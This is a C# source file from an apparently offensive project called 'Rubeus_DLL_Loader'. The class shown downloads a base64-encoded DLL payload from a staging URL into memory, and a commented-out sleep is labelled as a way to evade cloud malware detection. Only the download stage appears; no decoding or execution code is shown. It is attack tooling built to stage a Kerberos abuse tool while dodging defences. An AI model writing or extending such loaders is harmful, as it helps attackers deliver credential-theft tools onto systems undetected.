using System;
using System.Net;
using System.IO;
using System.Security.Authentication;
using System.Threading;

namespace Rubeus_DLL_Loader
{
    class Networking
    {
        /*
         * Purpose:
         *   This function will reach out to the staging URL and pull the DLL into memory as a base64 encoded payload
         * Arguments:
         *   staging_url - http server where the payload is hosted
         * Output:
         *   b64dll - Base 64 encoded string containing the payload  
         */
        public string Get_Payload(string staging_url)
        {
            //.NET Framework doesn't do TLS 1.2 by default
            //https://support.microsoft.com/en-us/topic/support-for-tls-system-default-versions-included-in-the-net-framework-3-5-on-windows-8-1-and-windows-server-2012-r2-499ff5ef-a88a-128b-c639-ed038b7d2d5f

            const SslProtocols _Tls12 = (SslProtocols)0x00000C00;
            const SecurityProtocolType Tls12 = (SecurityProtocolType)_Tls12;
            ServicePointManager.SecurityProtocol = Tls12;

            //Define webrequest object
            WebRequest payload;
            Console.WriteLine("[*] Getting From: {0}", staging_url);

            //Sleep to evade Cloud malware detection
            //Thread.Sleep(30000);

            //Set the URL for the webrequest
            payload = WebRequest.Create(staging_url);

            //Setup stream object for http responses this will need to be parsed out later
            payload.Method = "GET";
            Stream resp_stream = payload.GetResponse().GetResponseStream();
            StreamReader resp_reader = new StreamReader(resp_stream);

            //Read stream
            return resp_reader.ReadToEnd();
        }
    }
}
